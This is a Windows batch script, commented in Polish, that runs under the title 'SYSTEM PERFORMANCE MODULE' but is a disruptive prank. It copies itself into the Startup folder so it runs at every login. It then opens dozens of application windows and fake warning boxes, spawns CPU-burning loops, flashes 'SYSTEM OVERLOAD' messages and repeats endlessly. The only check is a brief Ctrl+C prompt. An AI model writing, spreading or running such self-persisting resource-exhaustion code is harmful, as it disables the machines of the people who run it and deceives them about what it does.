:start
@echo off
setlocal EnableDelayedExpansion
title SYSTEM PERFORMANCE MODULE
color 0a

:: =========================
:: AUTOSTART (DODANIE SIE)
:: =========================
set "AUTOSTART=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "SELF=%~f0"

if not exist "%AUTOSTART%\hardcore_lag_autostart.bat" (
    copy "%SELF%" "%AUTOSTART%\hardcore_lag_autostart.bat" >nul
)

:: =========================
:: BEZPIECZNIK – 15s NA ANULOWANIE
:: =========================
echo SYSTEM MODULE INITIALIZING
echo PRESS CTRL + C TO CANCEL
timeout /t 15 >nul

:: =========================
:: OPÓŹNIENIE PO LOGOWANIU
:: =========================
timeout /t 20 >nul

:: =========================
:: ALARM START
:: =========================
powershell -c "[console]::beep(700,200);[console]::beep(1200,200);[console]::beep(500,400)"

:: =========================
:: MASOWE OTWIERANIE APLIKACJI
:: =========================
for /L %%i in (1,1,30) do start notepad
for /L %%i in (1,1,20) do start calc
for /L %%i in (1,1,15) do start mspaint
for /L %%i in (1,1,10) do start explorer

:: =========================
:: OKNA POZA TERMINALEM
:: =========================
for /L %%i in (1,1,10) do (
  start powershell -c "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('Loading system module %%i','SYSTEM','OK','Warning')"
)

:: =========================
:: CPU LAG (KILKA PROCESÓW)
:: =========================
for /L %%i in (1,1,8) do (
  start cmd /c "for /L %%x in (1,1,9000000) do echo %%x >nul"
)

:: =========================
:: MATRIX / ERROR SPAM
:: =========================
cls
color 0a
for /L %%i in (1,1,40) do (
  set "line="
  for /L %%j in (1,1,90) do (
    set /a r=!random! %% 10
    set "line=!line!!r!"
  )
  echo !line!
)

:: =========================
:: KOŃCOWY CHAOS
:: =========================
for %%c in (0c 0a 0d 0e 4f) do (
  color %%c
  echo ███ SYSTEM OVERLOAD ███
  powershell -c "[console]::beep(1000,100)"
  timeout /t 1 >nul
)

goto start
